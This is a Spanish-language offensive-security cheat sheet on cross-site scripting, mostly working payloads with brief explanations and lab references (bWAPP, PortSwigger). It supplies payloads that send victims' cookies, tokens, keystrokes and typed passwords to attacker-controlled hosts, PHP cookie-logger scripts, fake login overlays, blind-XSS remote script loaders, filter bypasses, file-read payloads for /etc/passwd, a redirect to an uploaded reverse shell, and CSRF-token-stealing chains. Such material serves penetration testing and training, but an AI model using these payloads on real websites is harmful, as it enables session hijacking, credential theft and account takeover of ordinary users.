# Cross Site Scripting (XSS)

# Table of contents

- [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
  - [TIPOS DE XSS](#tipos-de-xss)
    - [XSS ALMACENDO](#xss-almacendo)
    - [XSS REFLEJADO](#xss-reflejado)
    - [XSS BASADO EN DOM](#xss-basado-en-dom)
  - [EJEMPLOS DE PAYLOADS](#ejemplos-de-payloads)
  - [XSS en HTML/Applications](#xss-en-htmlapplications)
    - [Payloads comunes](#payloads-comunes)
    - [XSS usando tags HTML5](#xss-usando-tags-html5)
    - [XSS usando un remote JS](#xss-usando-un-remote-js)
    - [XSS en inputs ocultos](#xss-en-inputs-ocultos)
    - [XSS basado en DOM](#xss-basado-en-dom)
    - [XSSen contexto JS](#xssen-contexto-js)
  - [XSS en wrappers javascript y data URI](#xss-en-wrappers-javascript-y-data-uri)
  - [XSSen archivos](#xssen-archivos)
    - [XSS en XML](#xss-en-xml)
    - [XSS en SVG](#xss-en-svg)
    - [XSS en SVG (short)](#xss-en-svg-short)
    - [XSS en Markdown](#xss-en-markdown)
    - [XSS en SWF flash application](#xss-en-swf-flash-application)
    - [XSS en SWF flash application](#xss-en-swf-flash-application)
    - [XSS en CSS](#xss-en-css)
  - [Blind XSS](#blind-xss)
      - [BLIND XSS PAYLOADS](#blind-xss-payloads)
    - [XSSTRIKE](#xsstrike)
    - [XSS Hunter](#xss-hunter)
  - [BYPASS DE FILTROS](#bypass-de-filtros)
  - [XSS A LFI](#xss-a-lfi)
  - [XSS VIA FILE UPLOAD](#xss-via-file-upload)
  - [REVERSE SHELL MEDIANTE XSS Y FILE UPLOAD](#reverse-shell-mediante-xss-y-file-upload)
  - [XSS A SSRF](#xss-a-ssrf)
  - [XSS CON SQL INJECTION](#xss-con-sql-injection)
  - [XSS a RCE](#xss-a-rce)
  - [CSRF VIA XSS](#csrf-via-xss)
    - [CHAINING XSS + CSRF + BYPASS CSRF TOKEN](#chaining-xss--csrf--bypass-csrf-token)
  - [EXTENSIONES DE BURPSUITE PARA XSS](#extensiones-de-burpsuite-para-xss)
  - [PORTSWIGGER XSS](#portswigger-xss)
    - [REFLECTED XSS](#reflected-xss)

## INTRODUCCION

Cross-site scripting (XSS) es un tipo de vulnerabilidad de seguridad informática que normalmente se encuentra en aplicaciones web. XSS permite a los atacantes inyectar scripts del lado del cliente en las páginas web que ven otros usuarios.

Por tanto, acabada con esta vulnerabilidad, el atacante podría:

- Capturar y acceder a las cookies de sesión autenticadas del usuario.
- Carga una página de phishing para atraer a los usuarios a acciones involuntarias.
- Redirige a los visitantes a otras secciones maliciosas.
- Exponer los datos sensibles del usuario.
-Manipula la estructura de la aplicación web o incluso la desfigura.

## TIPOS DE XSS

### XSS ALMACENDO

El script malicioso inyectado se almacena permanentemente dentro del servidor de la base de datos de la aplicación web y el servidor lo elimina cuando el usuario visita el respectivo sitio web.

Sin embargo, esto sucede de una manera cuando el cliente hace clic o se desplaza sobre una sección infectada en particular, el navegador ejecutará el JavaScript inyectado como ya estaba en la base de datos de la aplicación. Por lo tanto, este ataque no requiere ninguna técnica de phishing para apuntar a sus usuarios.

Por ejemplo una entrada de datos de comentarios guarda dichos comentarios y te los carga la pagina web una vez comentado, basicamente eso se esta almacenando en algun lado en el servidor y si cargas un codigo malicionso en Javascript, cuando otro usuario va a la seccion de comentarios se estara encontrando con ese codigo malicioso.

Otro ejemplo es que cuando es un XSS almacenado puedes intentar un **HTML Injection** donde en vez de codigo JavaScript malicioso, puedes injectar un formulario como si fuera un login para que se almacene y cuando un usuario comente despues le salga como un login de inicio de sesion y parezca que se ha "deslogueado" y coloque sus credenciales de su pagina

### XSS REFLEJADO

Ocurre cuando la aplicación web responde inmediatamente a la entrada del usuario sin validar lo que el usuario ingresó, esto puede llevar a un atacante a inyectar código ejecutable del navegador dentro de la única respuesta HTML . Se denomina **"no persistente"** porque el script malicioso **no se almacena dentro de la base de datos del servidor web**.

El XSS reflejado es el más común y, por lo tanto, se puede encontrar fácilmente en los **campos de búsqueda del sitio web** donde el atacante incluye algunos códigos Javascript arbitrarios en el cuadro de texto de búsqueda y, si el sitio web es vulnerable, la página web muestra el evento como estaba. descrito en el guión.

### XSS BASADO EN DOM

El **DOM** - **Based** **Cross** - **Site** **Scripting** es la vulnerabilidad que aparece en una Document Object Model en lugar de en las páginas HTML.

**Las** vulnerabilidades **XSS basadas en DOM** generalmente surgen cuando JavaScript toma datos de una **fuente** controlable por el atacante, como la URL, y los pasa a un receptor (una función peligrosa de JavaScript o un objeto DOM _como eval()) que admite la ejecución de código dinámico.

## EJEMPLOS DE PAYLOADS

### STEALING COOKIES

Obtener la cookie de administrador o el token de acceso confidencial, la siguiente carga útil lo enviará a una página controlada por nosotros:

Nos montamos un servidor con python:

```python
python -m SimpleHTTPServer
```

payload:

```javascript
<script>document.write('<img src="http://<IP KALI>:8000/noexiste.jpg?cookie='+document.cookie+'">')</script>
```

Con esto se cargara una imagen y cuando la victima entra a esa seccion donde se muestra la imagen que injectamos, en el seervidor web de python nos mostrara su cookie de sesion de ese usuario. Con esto hemos podido secuestrar su cookie. (Cookie hijacking)

Payloads alternativos:

```javascript
<script>document.location='http://<IP KALI>:8000/grabber.php?c='+document.cookie</script>

<script>document.location='http://<IP KALI>:8000/grabber.php?c='+localStorage.getItem('access_token')</script>

<script>new Image().src="http://<IP KALI>:8000/cookie.php?c="+document.cookie;</script>

<script>new Image().src="http://<IP KALI>:8000/cookie.php?c="+localStorage.getItem('access_token');</script>

```

Donde el archivo grabber.php o cookie.php de los anteriores ejemplos puede tener el siguiente codigo:

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>

```

o:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### ROBO DE CREDENCIALES

podemos modificar el contenido de una pagina para agregarle un contenido propio, en este caso se esta modificando la pagina de login colocandole nuestro propio formulario:

```javascript
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

O injectar este payload en una entrada de datos:

```html
<div style="position: absolute; left: 0px; top: 0px;
background-color:#fddacd;width: 1900px; height:
1300px;"><h2>Please login to continue!!</h2>
<br><form name="login"
action="http://<IP KALI>:4444/login.htm">
<table><tr><td>Username:</td><td><input type="text"
name="username"/></td></tr><tr><td>Password:</td>
<td><input type="password" name="password"/></td></tr><tr>
<td colspan=2 align=center><input type="submit"
value="Login"/></td></tr>
</table></form>
```

Con netcat nos colocamos a la escucha en el puerto 4444:

```bash
nc -lvnp 4444
```

Y obtendremos las credenciales si se loguea:

```bash
...
GET /login.htm?username=admin&password=admin123! HTTP/1.1
...
```


[Funcion replaceState()](https://developer.mozilla.org/en-US/docs/Web/API/History/replaceState)

### JAVASCRIPT KEYLOGGING

Podemos capturar las pulsaciones del teclado (JavaScript Keylogger)

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://<IP KALI>:8000?k="+String.fromCharCode(e.which))},this.remove();'>

```

### REDIRECCIONAMIENTO 

Formularo de direccionamiento:

```javascript
var f=document.forms;var i=f.length-1;do{f[i].action="http://<IP KALI>:8000";f[i].onsubmit=null;}while(--i);
```

### mas payloads

- [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all)

- [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)

## Herramienta para detectar vulnerabilidad XSS

- [XSSer](https://github.com/epsylon/xsser)

```python
python3 xsser --url "http://192.168.0.9/bWAPP/xss_get.php?firstname=XSS&lastname=test1&form
=submit" --cookie "PHPSESSID=q6t1k21lah0ois25m0b4egps85;
security_level=1" --auto
```

- [XSStrike](https://github.com/s0md3v/XSStrike)

```python
python3 xsstrike.py -u http://192.168.0.9/bWAPP/xss_get.php?firstname=XSS&lastname=test1&form
=submit
```

## XSS en HTML/Applications

### Payloads comunes

```javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
#"><img src=/ onerror=alert(document.cookie)>
```

```
// Svg payload
<svG onload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

### XSS usando tags HTML5

```
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
```

### XSS usando un remote JS

```
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>

// you can also specify an arbitrary payload with 14.rs/#payload
e.g: 14.rs/#alert(document.domain)
```

### XSS en inputs ocultos

```
<input type="hidden" accesskey="X" onclick="alert(1)">
Use CTRL+SHIFT+X to trigger the onclick event
```

###  XSS basado en DOM

Colocar esto en la url.

```
#"><img src=/ onerror=alert(2)>
```

### XSSen contexto JS

```
-(confirm)(document.domain)//
; alert(1);//
// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
```

## XSS en wrappers javascript y data URI

XSS con javascript:

```
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

We can encode the "javascript:" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

Using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

XSS con data:

```
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

XSS con vbscript: solo IE (Internet Explore)

```
vbscript:msgbox("XSS")
```

## XSSen archivos

** NOTA:** la seccion XML CDATA se utiliza aquí para que la carga útil de JavaScript no se trate como marcado XML.

```
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### XSS en XML

```html
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

### XSS en SVG

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

### XSS en SVG (short)

```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

### XSS en Markdown

```C#

[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

### XSS en SWF flash application

```powershell

Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
```

mas payloads en ./files

### XSS en SWF flash application

```
flashmediaelement.swf?jsinitfunctio%gn=alert`1`
flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
plupload.flash.swf?%#target%g=alert&uid%g=XSS&
moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
video-js.swf?readyFunction=alert(1)
player.swf?playerready=alert(document.cookie)
player.swf?tracecall=alert(document.cookie)
banner.swf?clickTAG=javascript:alert(1);//
io.swf?yid=\"));}catch(e){alert(1);}//
video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
```

### XSS en CSS

```html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

Para mas payloads puedes consultar el cheatsheet de portswigger:

[CheatSheet XSS](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## Blind XSS

Una vulnerabilidad Blind XSS ocurre cuando la vulnerabilidad se activa en una página a la que no tenemos acceso.

Las vulnerabilidades ciegas de XSS generalmente ocurren con formularios a los que solo pueden acceder ciertos usuarios (por ejemplo, administradores). Algunos ejemplos potenciales incluyen:

-   Formularios de contacto
-   Reseñas
-   Detalles de usuario
-   Tickets de soporte
-   Encabezado de agente de usuario HTTP

digamos que tenemos el siguiente formulario:

![[Pasted image 20221220155523.png]]

En HTML, podemos escribir código JavaScript dentro de las `<script>`etiquetas, pero también podemos incluir un script remoto proporcionando su URL, de la siguiente manera:

```html
<script src="http://OUR_IP/script.js"></script>
```

Entonces, podemos usar esto para ejecutar un archivo JavaScript remoto que se sirve en nuestra máquina virtual. Podemos cambiar el nombre del script solicitado `script.js` por el nombre del campo que estamos inyectando, de modo que cuando recibamos la solicitud en nuestra VM, podamos identificar el campo de entrada vulnerable que ejecutó el script, de la siguiente manera:

```html
<script src="http://OUR_IP/username"></script>
```

Si recibimos una solicitud de `/username`, sabemos que el campo `username` es vulnerable a XSS, y así sucesivamente. Con eso, podemos comenzar a probar varias cargas útiles XSS que cargan un script remoto y ver cuál de ellos nos envía una solicitud. Los siguientes son algunos ejemplos que podemos usar de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss) :

#### BLIND XSS PAYLOADS

```html
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```

Antes de comenzar a enviar cargas útiles, debemos iniciar un oyente en nuestra VM, usando `netcat` o `php`:

```bash
sudo php -S 0.0.0.0:80

sudo nc -lvnp 80
```

Ahora podemos comenzar a probar estas cargas útiles una por una usando una de ellas para todos los campos de entrada y agregando el nombre del campo después de nuestra IP, como se mencionó anteriormente, como:

```html
"><script src=http://10.10.14.145:8080/picture?c=document.cookie></script> #this goes inside the full-name field

<script src=http://OUR_IP/username></script> #this goes inside the username field
```

ejemplo:

```html
"><script src=http://10.10.14.145:8080/pic></script>

<!--steal cookie-->
"><script src="http://10.10.14.145:8000/test.php?c="+document.cookie></script>
"><script>new Image().src="http://10.10.14.145:8000/cookie.php?c="+document.cookie;</script>
```

![[Pasted image 20221220160755.png]]

### XSSTRIKE

El uso de esta opción durante el rastreo hará que XSStrike inyecte su carga útil XSS ciega definida `core/config.py` para que se inyecte en cada parámetro de cada formulario HTML.

```bash
python xsstrike.py -u http://example.com/page.php?q=query --crawl --blind
```

### XSS Hunter

Disponible en [https://xsshunter.com/app](https://xsshunter.com/app)

> XSS Hunter le permite encontrar todo tipo de vulnerabilidades de secuencias de comandos entre sitios, incluido el XSS ciego que a menudo se pasa por alto. El servicio funciona alojando sondas XSS especializadas que, al dispararse, escanean la página y envían información sobre la página vulnerable al servicio XSS Hunter.

```javascript
"><script src=//yoursubdomain.xss.ht></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursubdomain.xss.ht\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yoursubdomain.xss.ht");a.send();</script>

<script>$.getScript("//yoursubdomain.xss.ht")</script>
```


## BYPASS DE FILTROS

Case sensitive:

```javascript
<sCrIpt>alert(1)</ScRipt>
```

tag blacklist:

```javascript
<script x>
<script x>alert('XSS')<script y>
```

tag personalizada:

```
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

XSS reflejado con controladores de eventos y atributos href bloqueados

```
<svg><a><animate+attributeName=href+values=javascript:alert(1) /><text+x=20+y=20>Click me</text></a>
```

Omitir lista negra de palabras con evaluación de código:

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;

```

Bypass con un tag html inCompleto:

```html
<img src='1' onerror='alert(0)' <
```

Bypass de comillas en string:

```javascript
String.fromCharCode(88,83,83)

```

Para mas bypasses:

[Mas Bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads)

## XSS A LFI

```javascript
<script> 
	x=new XMLHttpRequest; 
	x.onload=function(){ 
		document.write(this.responseText) 
	}; 
	x.open("GET","file:///etc/passwd"); 
	x.send(); 
</script>
```

```javascript
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
```

```javascript
<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
```

Cargas utiles que puede combinar con los ejempolos anteriores:

```javascript
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
```

## XSS VIA FILE UPLOAD

Supongamos que puede subir una imagen en formato jpg a la pagina, puede validar lo siguiente:

1. Cambie el nombre de la imagen a lo siguiente:

```javascript
"><img src=x onerror=prompt(1)>
```

Y que dara como: **"\>\<img src=x onerror=prompt(1)\>.jpg**

2. Cargue la imagen y si es vulnerable la aplicacion podra ver un promt.

Otra forma es mediante la modifiaccion de los metadatos de la imagen:

1. Vea los metadatos de una imagen usando exiftool.

```bash
./exiftool foto.jpg
```

2. Modifique un valor de un metadato que admita un contenido como el anterior (**"\>\<img src=x onerror=prompt(1)\>.jpg**). Puede que File size, File type u otro no se lo permita. En este caso se modificara el metadato author.

```bash
./exiftool -Author='"><img src=x onerror=prompt(document.domain)>' foto.jpg -w
```

3. Cargue la imagen modificada y puede que obtenga la salida de un prompt.

[https://medium.com/@lucideus/xss-via-file-upload-lucideus-research-eee5526ec5e2](https://medium.com/@lucideus/xss-via-file-upload-lucideus-research-eee5526ec5e2)

## REVERSE SHELL MEDIANTE XSS Y FILE UPLOAD

Puede cargar una reverse shell en php o el lenguaje que interprete la pagina, en este caso usaremos la reverse shell de monkey pentester:

[http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

Nos colocamos a la escucha por netcat.

Y si vemos una vulnerabilidad de XSS almacenado y conocemos donde se almacena el archivo php reverse shell, podemos apuntar a el mediante una injeccion XSS javascript:

```javascript
<script>window.location='http://10.10.10.45/images/reverse_shell.php'</script>
```

## XSS A SSRF

En cloud environment:

[https://namratha-gm.medium.com/chaining-bugs-escalating-xss-to-ssrf-5cd3d986a97c](https://namratha-gm.medium.com/chaining-bugs-escalating-xss-to-ssrf-5cd3d986a97c)

## XSS CON SQL INJECTION

Supongamos la siguiente url:

```
http://exploitable-web.com/link.php?id=1
```

Al colocar una comilla simple **'** en el id ocurre un fallo de base de datos.

Podemos colocar el siguiente payload:

```
'; <img src = x onerror = prompt (/ XSS /)>
```

La inyección anterior abrirá un cuadro de diálogo que dice XSS.

Una vez que se obtiene el Número de columna y estamos listos con nuestra Consulta de unión. Supongamos que tenemos 4 columnas, por lo que nuestra consulta de unión será:

```
http://exploitable-web.com/link.php?id=1' union select 1,2,3,4--
```

Podemos inyectar el payload anterior codificado en hexadecimal:

```
#payload

<img src=x onerror=confirm(/XSS/)>

#hexadecimal

0x3c696d67207372633d78206f6e6572726f723d636f6e6669726d282f5853532f293e
```

Ahora lo inyectamos en la consulta SQL:

```
http://exploitable-web.com/link.php?id=-1' union select 1,2,0x3c696d67207372633d78206f6e6572726f723d636f6e6669726d282f5853532f293e,4--
```

Fuente:

- [http://www.securityidiots.com/Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html)
- [https://medium.com/@tattwei46/what-is-sql-injection-and-xss-2a3f2e7ea0d](https://medium.com/@tattwei46/what-is-sql-injection-and-xss-2a3f2e7ea0d)

## XSS a RCE

- [https://loca1gh0s7.github.io/MFH-from-XSS-to-RCE-loca1gh0st-exercise/](https://loca1gh0s7.github.io/MFH-from-XSS-to-RCE-loca1gh0st-exercise/)


## CSRF VIA XSS

Las aplicaciones web que sufren la vulnerabilidad XSS y CSRF le permiten manipular la contraseña del usuario o la dirección de correo electrónico registrada.

En el caso de que tengamos un CSRF y un XSS almacenado, la idea es agarrar la url donde se actualiza la contraseña y apuntar a ella mediante una inyeccion xss:

```javascript
<img
src=”http://192.168.0.14/bWAPP/csrf_1.php?password_new=hola123&password_conf=hola123
&action=change”>
```

esto lo colocamos en el campo vulnerable de XSS y como se almacena, cuando otro usuario ingrese a la pagina donde se almaceno ese XSS obviamente vera que una imagen no cargapero ya le habremos cambiado la contraseña a hola123.

### CHAINING XSS + CSRF + BYPASS CSRF TOKEN

Las solicitudes maliciosas entre sitios están fuera de la ecuación debido a las protecciones del mismo origen/mismo sitio. Todavía podemos realizar un ataque CSRF a través de la vulnerabilidad XSS almacenada que existe. Específicamente, aprovecharemos la vulnerabilidad XSS almacenada para emitir una solicitud de cambio de estado contra la aplicación web. ¡Una solicitud a través de XSS omitirá cualquier protección del mismo origen/mismo sitio ya que se derivará del mismo dominio!

Payload XSS:

```javascript
<script>
//primera peticion para obtener el CSRF token
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
	//recuperacion del CSRF Token
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];

	//segunda peticion para realizar el Ataque CSRF pasando el Anti CSRF-Token
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

Como estamos aprovechando una vulnerabilidad XSS almacenada, al momento de ejecutarse o llamarse realizara una accion dentro de la cuenta del usuario (**Si se encuentra logueado**) sin su consentimiento.

## EXTENSIONES DE BURPSUITE PARA XSS

- [https://www.hackingarticles.in/burp-suite-for-pentester-xss-validator/](https://www.hackingarticles.in/burp-suite-for-pentester-xss-validator/)
- [https://portswigger.net/bappstore/98275a25394a417c9480f58740c1d981](https://portswigger.net/bappstore/98275a25394a417c9480f58740c1d981)

## PORTSWIGGER XSS

### REFLECTED XSS

**Reflected XSS into HTML context with nothing encoded**

Injeccion del xss en la url.

```javascript
https://ac8b1f691ebdc38080c22ae8003f00e7.web-security-academy.net/?search=%3Cscript%3Ealert(%27hola%20mundo!%27)%3C/script%3E
```

**Explotación de secuencias de comandos entre sitios para robar cookies**

Injeccion del xss para robar cookies. Podemos hacerlo con fetch():

```javascript
<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script> 
```

- [https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch)

- [https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/fetch](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/fetch)

**Exploiting cross-site scripting to capture passwords**

Robo de credenciales a traves de un XSS almacenado en el input comentario:

```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

agregamos 2 inputs uno de usuario y otro de contraseña, cuando la contraseña se empiece a escribir mandara el los valores a un servidor remoto. Esto puede ser mas elaborado esteticamente.

**Exploiting XSS to perform CSRF**



```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

[https://www.yuninfosec.com/exploiting-cross-site-scripting-vulnerabilities-with-burp-suite/](https://www.yuninfosec.com/exploiting-cross-site-scripting-vulnerabilities-with-burp-suite/)